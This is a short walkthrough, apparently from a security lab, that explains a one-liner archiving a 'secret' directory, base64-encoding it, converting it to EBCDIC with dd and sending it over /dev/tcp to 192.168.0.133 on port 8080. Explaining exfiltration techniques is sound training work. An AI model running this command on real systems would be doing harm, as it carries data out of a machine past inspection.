To zip a file 
tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080

We used the tar command to create an archive file with the zcf arguments of the content of the secret directory.
The z is for using gzip to compress the selected folder, 
the c is for creating a new archive, 
and the f is for using an archive file.
We then passed the created tar file to the base64 command for converting it to base64 representation.
Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.
Finally, we redirect the dd command's output to transfer it using the TCP socket on the specified IP and port, which in this case, port 8080.
